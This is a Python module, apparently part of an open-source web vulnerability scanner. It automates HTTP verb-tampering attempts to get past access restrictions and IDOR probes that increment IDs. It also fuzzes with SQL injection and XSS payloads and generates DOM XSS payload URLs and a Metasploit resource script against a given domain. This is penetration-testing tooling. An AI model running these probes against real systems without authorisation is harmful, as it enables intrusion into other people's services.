#exploit.py
#Date-13/12/2025
#update-on-16/02/2026
#Author- Lokesh Kumar 
#github - @trmxvibs
#Madeinindia
import requests
import re
from urllib.parse import urljoin, urlparse, parse_qs
from modules.config import get_bypass_headers
from modules.validator import ContextEngine

def check_verb_tampering(url):
    """
    Checks if an endpoint allows different HTTP methods (Verb Tampering).
    Useful for bypassing 403/401 restrictions.
    """
    report = []
    # We avoid DELETE to prevent accidental data loss
    methods = ["POST", "PUT", "HEAD", "PATCH"]
    
    try:
        # 1. Baseline Request
        original = requests.get(url, headers=get_bypass_headers(), timeout=3)
        if original.status_code not in [401, 403]:
            return [] # Skip if already accessible
            
        # 2. Try Flipping Methods
        for method in methods:
            try:
                res = requests.request(method, url, headers=get_bypass_headers(), timeout=3)
                # If we get a 200 OK where GET gave 403, it's a huge finding
                if res.status_code == 200 and len(res.text) > 50:
                    report.append(f"   [☠️] VERB TAMPERING SUCCESS: {method} Allowed!")
                    report.append(f"       > URL: {url}")
                    report.append(f"       > Bypass: GET({original.status_code}) -> {method}(200)")
            except: pass
    except: pass
    return report

def check_bola_idor(base_url, endpoint):
    """
    Smart BOLA/IDOR Detector.
    Identifies numeric IDs in URL, increments them, and checks if data is valid using ContextEngine.
    """
    report = []
    full_url = urljoin(base_url, endpoint)
    
    # Regex to find numeric IDs (e.g., /users/101 or ?id=101)
    # Group 1: Prefix, Group 2: ID, Group 3: Suffix
    id_pattern = re.compile(r'([=/])(\d{1,10})($|[&?])')
    match = id_pattern.search(endpoint)
    
    if match:
        prefix, original_id, suffix = match.groups()
        
        # Logic: Try Original vs (Original + 1)
        try:
            test_id = str(int(original_id) + 1)
            # Reconstruct URL with new ID
            new_endpoint = endpoint.replace(f"{prefix}{original_id}{suffix}", f"{prefix}{test_id}{suffix}", 1)
            target_url = urljoin(base_url, new_endpoint)
            
            # Active Verification
            r_orig = requests.get(full_url, headers=get_bypass_headers(), timeout=5)
            r_test = requests.get(target_url, headers=get_bypass_headers(), timeout=5)
            
            # 1. Status Code Check (Must be 200)
            if r_test.status_code == 200:
                # 2. Context Analysis (Is it just a generic success page?)
                similarity = ContextEngine.calculate_similarity(r_orig.text, r_test.text)
                
                # Logic: 
                # If similarity is 1.0 (Identical) -> Probably static page, not an IDOR.
                # If similarity is < 0.5 (Too different) -> Probably 404/Error page.
                # Sweet Spot: 0.8 - 0.99 (Structure same, data different)
                if 0.8 < similarity < 0.99:
                    report.append(f"   [☠️] CONFIRMED BOLA/IDOR: {target_url}")
                    report.append(f"       > Original ID: {original_id} | Test ID: {test_id}")
                    report.append(f"       > Context Match: {int(similarity*100)}% (Valid Data Structure)")
                    
        except ValueError: pass # ID wasn't an integer

    return report

def api_zombie_fuzzer(endpoints, domain):
    if not endpoints: return ""
    report = ["\n[*] API ZOMBIE (LOGIC HUNTER):"]
    base_url = f"http://{domain}"
    
    vuln_found = False
    
    # Limit scanning to top 15 interesting endpoints to save time
    targets = list(endpoints)[:15]
    
    for ep in targets:
        # 1. Run BOLA/IDOR Check
        bola_res = check_bola_idor(base_url, ep)
        if bola_res:
            report.extend(bola_res)
            vuln_found = True
            
        # 2. Run Verb Tampering Check (Only if 'admin' or 'api' in URL)
        if "admin" in ep or "api" in ep or "config" in ep:
            verb_res = check_verb_tampering(urljoin(base_url, ep))
            if verb_res:
                report.extend(verb_res)
                vuln_found = True

    # 3. Traditional Fuzzing (Lightweight Fallback)
    # Sirf un URLs par jaha parameters hon
    fuzz_targets = [ep for ep in targets if "=" in ep]
    payloads = ["' OR 1=1 --", "<script>alert(1)</script>"]
    
    for ep in fuzz_targets[:5]:
        target = urljoin(base_url, ep)
        for pay in payloads:
            try:
                # Append payload to query params
                fuzz_url = f"{target}&test={pay}" if "?" in target else f"{target}?q={pay}"
                r = requests.get(fuzz_url, headers=get_bypass_headers(), timeout=2)
                
                if r.status_code == 500:
                    report.append(f"   [⚠️] API 500 ERROR (Potential DoS): {target}")
                    vuln_found = True; break
            except: pass

    if not vuln_found: report.append("   [✓] No Logic or IDOR vulnerabilities detected.")
    return "\n".join(report)

def generate_dom_payloads(url, sink_type):
    report = [f"\n[*] DOM EXPLOIT SUGGESTIONS for {sink_type}:"]
    # ... (Keeping existing logic for brevity) ...
    payloads = []
    if "innerHTML" in sink_type:
        payloads = [f"{url}#<img src=x onerror=alert(1)>", f"{url}?q=<svg/onload=alert(1)>"]
    elif "eval" in sink_type:
        payloads = [f"{url}?q=alert(1)"]
    elif "location" in sink_type:
        payloads = [f"{url}?next=javascript:alert(1)"]
    
    report.append("   [i] Manual Verification Required. Try these in Browser:")
    for p in payloads: report.append(f"       > {p}")
    return "\n".join(report)

def generate_attack_commands(domain, scan_text, tech_list):
    cmds = ["\n[*] WEAPONIZER:"]
    if "80/tcp" in scan_text: cmds.append(f"   [WEB] nikto -h {domain}")
    return "\n".join(cmds)

def generate_metasploit_script(domain, scan_text):
    msf = ["\n[*] METASPLOIT SCRIPT (RCE):"]
    script = [f"workspace -a {domain}", f"db_nmap -sV {domain}"]
    if "80/tcp" in scan_text:
        script.append("use auxiliary/scanner/http/dir_scanner")
        script.append(f"set RHOSTS {domain}")
        script.append("run")
    msf.append("\n".join(script))
    msf.append("[i] Save as 'attack.rc' and run: msfconsole -r attack.rc")
    return "\n".join(msf)
